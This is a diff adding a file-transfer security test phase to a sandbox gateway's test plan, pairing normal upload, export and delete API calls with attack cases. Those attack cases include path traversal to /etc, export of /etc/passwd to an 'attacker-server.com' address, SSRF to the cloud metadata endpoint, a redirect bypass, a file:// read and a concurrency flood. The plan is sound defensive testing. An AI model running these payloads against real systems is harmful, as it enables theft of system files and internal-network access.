@@ -582,3 +582,559 @@ except MemoryError:
     The exact numbers might vary slightly, but the key is the `"No space left on device"` error and the fact that the command did not complete successfully.
 
 *   **Security Assessment**: ✅ **Secure**. This proves that the storage quota is active and effectively prevents a single worker container from consuming more than its allocated disk space. This protects the host and all other containers from disk-based Denial of Service attacks.
+
+---
+
+### **Phase 9: File Transfer Security & Functionality Test**
+
+**Objective**: To comprehensively test the file upload, export, and delete APIs, verifying both normal operations and security measures against various attack vectors.
+
+**Prerequisites**:
+- A running service with a valid auth token
+- For upload tests, you need publicly accessible presigned URLs (e.g., from AWS S3, Aliyun OSS)
+- For export tests, you need writable presigned URLs
+
+**Note**: These tests are performed via API calls, not through the Jupyter notebook interface. Use `curl`, `httpx`, or any HTTP client.
+
+---
+
+#### **Test 9.1: Normal File Upload (Single File)**
+
+**Objective**: Verify that a single file can be uploaded successfully to the sandbox.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "https://your-oss-bucket.com/test-file.txt",
+        "path": "/sandbox/",
+        "name": "test-file.txt"
+      }
+    ]
+  }'
+```
+
+**Expected Response (201 Created)**:
+```json
+{
+  "success": true,
+  "results": [
+    {"full_path": "/sandbox/test-file.txt", "size": 1234}
+  ]
+}
+```
+
+**Verification** (in Jupyter session):
+```python
+import os
+assert os.path.exists('/sandbox/test-file.txt'), "File should exist"
+with open('/sandbox/test-file.txt', 'r') as f:
+    content = f.read()
+print(f"✅ File uploaded successfully. Size: {len(content)} bytes")
+```
+
+---
+
+#### **Test 9.2: Normal File Upload (Batch with Subdirectory)**
+
+**Objective**: Verify batch upload and automatic subdirectory creation.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {"download_url": "https://example.com/data.csv", "path": "/sandbox/data/", "name": "input.csv"},
+      {"download_url": "https://example.com/image.png", "path": "/sandbox/images/", "name": "photo.png"},
+      {"download_url": "https://example.com/config.json", "path": "/sandbox/config/nested/deep/", "name": "settings.json"}
+    ]
+  }'
+```
+
+**Expected Response (201 Created)**:
+```json
+{
+  "success": true,
+  "results": [
+    {"full_path": "/sandbox/data/input.csv", "size": ...},
+    {"full_path": "/sandbox/images/photo.png", "size": ...},
+    {"full_path": "/sandbox/config/nested/deep/settings.json", "size": ...}
+  ]
+}
+```
+
+**Verification** (in Jupyter session):
+```python
+import os
+paths = [
+    '/sandbox/data/input.csv',
+    '/sandbox/images/photo.png',
+    '/sandbox/config/nested/deep/settings.json'
+]
+for p in paths:
+    assert os.path.exists(p), f"File {p} should exist"
+print("✅ Batch upload with nested directories successful")
+```
+
+---
+
+#### **Test 9.3: Normal File Export**
+
+**Objective**: Verify that files can be exported from sandbox to external storage.
+
+**Setup** (create a file in Jupyter first):
+```python
+with open('/sandbox/result.txt', 'w') as f:
+    f.write('Hello from sandbox! This is the computation result.')
+print("Created /sandbox/result.txt for export test")
+```
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files/export?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "path": "/sandbox/",
+        "name": "result.txt",
+        "upload_url": "https://your-oss-bucket.com/presigned-upload-url"
+      }
+    ]
+  }'
+```
+
+**Expected Response (200 OK)**:
+```json
+{
+  "success": true,
+  "results": [
+    {"path": "/sandbox/", "name": "result.txt", "size": 51}
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Functional**. The export correctly reads from the Gateway's mount point and uploads via presigned URL.
+
+---
+
+#### **Test 9.4: Normal File Delete**
+
+**Objective**: Verify that files can be deleted from sandbox.
+
+**API Call**:
+```bash
+curl -X DELETE "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {"path": "/sandbox/", "name": "result.txt"}
+    ]
+  }'
+```
+
+**Expected Response (204 No Content)**: Empty body with status 204.
+
+**Verification** (in Jupyter session):
+```python
+import os
+assert not os.path.exists('/sandbox/result.txt'), "File should be deleted"
+print("✅ File deleted successfully")
+```
+
+---
+
+#### **Test 9.5: Path Traversal Attack (Upload)**
+
+**Objective**: Attempt to upload a file outside the sandbox using `../` path traversal.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "https://example.com/malicious.sh",
+        "path": "/sandbox/../../../etc/",
+        "name": "cron.d"
+      }
+    ]
+  }'
+```
+
+**Expected Response (422 Unprocessable Entity)**:
+```json
+{
+  "detail": [
+    {
+      "type": "value_error",
+      "loc": ["body", "files", 0, "path"],
+      "msg": "Value error, Path escapes sandbox boundary"
+    }
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Secure**. The `PurePosixPath.relative_to()` check correctly detects and blocks the traversal attempt. No file is written to `/etc/`.
+
+---
+
+#### **Test 9.6: Path Traversal Attack (Export)**
+
+**Objective**: Attempt to export sensitive system files from outside the sandbox.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files/export?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "path": "/sandbox/../../etc/",
+        "name": "passwd",
+        "upload_url": "https://attacker-server.com/receive"
+      }
+    ]
+  }'
+```
+
+**Expected Response (422 Unprocessable Entity)**:
+```json
+{
+  "detail": [
+    {
+      "type": "value_error",
+      "loc": ["body", "files", 0, "path"],
+      "msg": "Value error, Path escapes sandbox boundary"
+    }
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Secure**. The path validation prevents exfiltration of sensitive files like `/etc/passwd`.
+
+---
+
+#### **Test 9.7: Filename with Path Separator**
+
+**Objective**: Attempt to inject a path separator in the filename to escape sandbox.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "https://example.com/malicious.sh",
+        "path": "/sandbox/",
+        "name": "../../../etc/passwd"
+      }
+    ]
+  }'
+```
+
+**Expected Response (422 Unprocessable Entity)**:
+```json
+{
+  "detail": [
+    {
+      "type": "value_error",
+      "loc": ["body", "files", 0, "name"],
+      "msg": "Value error, Filename cannot contain path separators"
+    }
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Secure**. Filenames containing `/` or `\` are rejected at the validation layer.
+
+---
+
+#### **Test 9.8: SSRF Attack (Internal IP)**
+
+**Objective**: Attempt to make the Gateway fetch from an internal IP address.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "http://169.254.169.254/latest/meta-data/",
+        "path": "/sandbox/",
+        "name": "aws-metadata.txt"
+      }
+    ]
+  }'
+```
+
+**Expected Response (400 Bad Request or 500 Internal Server Error)**:
+The response should indicate that the URL was blocked by SSRF protection. The exact error depends on implementation, but no request should be made to the internal IP.
+
+*   **Security Assessment**: ✅ **Secure**. The `ssrf-protect` library blocks requests to:
+    - Cloud metadata endpoints (169.254.169.254)
+    - Private IP ranges (10.x, 172.16-31.x, 192.168.x)
+    - Localhost (127.x)
+    - Internal hostnames
+
+---
+
+#### **Test 9.9: SSRF Bypass via Redirect**
+
+**Objective**: Attempt to bypass SSRF protection using HTTP redirect.
+
+**Setup**: Create a URL that redirects to an internal address. For example, a server at `https://attacker.com/redirect` that responds with:
+```
+HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/
+```
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "https://attacker.com/redirect-to-internal",
+        "path": "/sandbox/",
+        "name": "redirected.txt"
+      }
+    ]
+  }'
+```
+
+**Expected Behavior**: The request should fail because `allow_redirects=False` is set. The Gateway will not follow the redirect.
+
+*   **Security Assessment**: ✅ **Secure**. HTTP redirects are disabled, preventing redirect-based SSRF bypass attacks.
+
+---
+
+#### **Test 9.10: Oversized File Upload**
+
+**Objective**: Attempt to upload a file exceeding the 100MB limit.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "https://example.com/huge-file-200mb.zip",
+        "path": "/sandbox/",
+        "name": "huge.zip"
+      }
+    ]
+  }'
+```
+
+**Expected Response (400 Bad Request or 500 with specific error)**:
+The response should indicate that the file exceeds the maximum allowed size. The transfer should be aborted mid-stream.
+
+**Verification** (in Jupyter session):
+```python
+import os
+# The file should either not exist or be incomplete
+if os.path.exists('/sandbox/huge.zip'):
+    size = os.path.getsize('/sandbox/huge.zip')
+    print(f"🚩 WARNING: File exists with size {size}. Should have been cleaned up.")
+else:
+    print("✅ SECURE: Oversized file was rejected and cleaned up")
+```
+
+*   **Security Assessment**: ✅ **Secure**. The streaming size check aborts the transfer once the limit is exceeded, and the temp file is cleaned up.
+
+---
+
+#### **Test 9.11: Export Non-Existent File**
+
+**Objective**: Attempt to export a file that doesn't exist.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files/export?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "path": "/sandbox/",
+        "name": "this-file-does-not-exist.txt",
+        "upload_url": "https://example.com/upload"
+      }
+    ]
+  }'
+```
+
+**Expected Response (500 Internal Server Error or 400 Bad Request)**:
+```json
+{
+  "detail": "Export failed: 1/1 file(s) failed. First error: FileNotFoundError"
+}
+```
+
+*   **Security Assessment**: ✅ **Handled**. The error is reported gracefully without exposing internal paths.
+
+---
+
+#### **Test 9.12: Batch Operation Partial Failure**
+
+**Objective**: Test behavior when some files in a batch succeed and others fail.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files/export?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {"path": "/sandbox/", "name": "existing-file.txt", "upload_url": "https://valid-url.com/1"},
+      {"path": "/sandbox/", "name": "non-existent.txt", "upload_url": "https://valid-url.com/2"},
+      {"path": "/sandbox/", "name": "another-existing.txt", "upload_url": "https://valid-url.com/3"}
+    ]
+  }'
+```
+
+**Expected Response (500 Internal Server Error)**:
+```json
+{
+  "detail": "Export failed: 1/3 file(s) failed. First error: FileNotFoundError"
+}
+```
+
+*   **Security Assessment**: ✅ **Handled**. Batch operations fail atomically when any file fails, preventing partial state issues.
+
+---
+
+#### **Test 9.13: Request Limits (Too Many Files)**
+
+**Objective**: Attempt to exceed the 100-file batch limit.
+
+**API Call**: Send a request with 101 files in the array.
+
+**Expected Response (422 Unprocessable Entity)**:
+```json
+{
+  "detail": [
+    {
+      "type": "value_error",
+      "loc": ["body", "files"],
+      "msg": "List should have at most 100 items after validation, not 101"
+    }
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Secure**. The batch size limit prevents abuse through excessive file counts.
+
+---
+
+#### **Test 9.14: Concurrent Upload Stress Test**
+
+**Objective**: Verify that concurrent file operations are properly throttled by the semaphore.
+
+**Test Script** (Python):
+```python
+import asyncio
+import httpx
+import time
+
+GATEWAY_URL = "http://127.0.0.1:3874"
+USER_UUID = "your-uuid"
+TOKEN = "your-token"
+
+async def upload_file(client: httpx.AsyncClient, file_num: int):
+    start = time.time()
+    response = await client.post(
+        f"{GATEWAY_URL}/api/v1/files",
+        params={"user_uuid": USER_UUID},
+        json={
+            "files": [{
+                "download_url": f"https://example.com/file{file_num}.txt",
+                "path": "/sandbox/concurrent/",
+                "name": f"file{file_num}.txt"
+            }]
+        },
+        timeout=60.0
+    )
+    elapsed = time.time() - start
+    return file_num, response.status_code, elapsed
+
+async def main():
+    headers = {"X-Auth-Token": TOKEN}
+    async with httpx.AsyncClient(headers=headers) as client:
+        # Launch 20 concurrent uploads
+        tasks = [upload_file(client, i) for i in range(20)]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for r in results:
+            if isinstance(r, Exception):
+                print(f"Error: {r}")
+            else:
+                file_num, status, elapsed = r
+                print(f"File {file_num}: {status} in {elapsed:.2f}s")
+
+asyncio.run(main())
+```
+
+**Expected Behavior**:
+- All uploads should eventually succeed (status 201)
+- Some uploads will take longer due to semaphore queueing
+- No server errors from resource exhaustion
+
+*   **Security Assessment**: ✅ **Secure**. The semaphore prevents resource exhaustion from concurrent transfer floods.
+
+---
+
+#### **Test 9.15: Invalid URL Scheme**
+
+**Objective**: Attempt to use non-HTTP schemes in download URL.
+
+**API Call**:
+```bash
+curl -X POST "http://127.0.0.1:3874/api/v1/files?user_uuid=YOUR_UUID" \
+  -H "X-Auth-Token: YOUR_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "files": [
+      {
+        "download_url": "file:///etc/passwd",
+        "path": "/sandbox/",
+        "name": "passwd.txt"
+      }
+    ]
+  }'
+```
+
+**Expected Response (422 Unprocessable Entity)**:
+```json
+{
+  "detail": [
+    {
+      "type": "url_parsing",
+      "loc": ["body", "files", 0, "download_url"],
+      "msg": "URL scheme should be 'http' or 'https'"
+    }
+  ]
+}
+```
+
+*   **Security Assessment**: ✅ **Secure**. Only HTTP/HTTPS schemes are allowed, blocking `file://`, `ftp://`, `gopher://`, etc.
